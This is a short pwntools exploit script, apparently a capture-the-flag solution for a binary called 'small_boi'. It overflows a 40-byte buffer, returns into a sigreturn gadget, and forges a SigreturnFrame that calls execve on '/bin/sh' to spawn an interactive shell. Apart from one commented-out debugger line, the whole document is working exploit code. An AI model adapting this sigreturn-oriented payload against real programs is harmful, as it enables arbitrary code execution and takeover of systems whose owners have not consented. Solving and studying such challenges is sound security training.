from pwn import *

p = process(["./small_boi"])

context.arch = "amd64"

offset = b'A'*40

sigret = 0x40017c
syscall = 0x400185
bin_sh = 0x4001ca

frame = SigreturnFrame()
frame.rip = syscall # sycall
frame.rax = 0x3b # execve
frame.rdi = bin_sh # bin_sh
frame.rsi = 0x0
frame.rdx = 0x0

payload = offset
payload += p64(sigret)
payload += bytes(frame)[8:] # if rdi goes to rsi, need to shift 8 bytes

# gdb.attach(p,gdbscript="""init-gef
# # br *0x4001ac""")

p.sendline(payload)

p.interactive()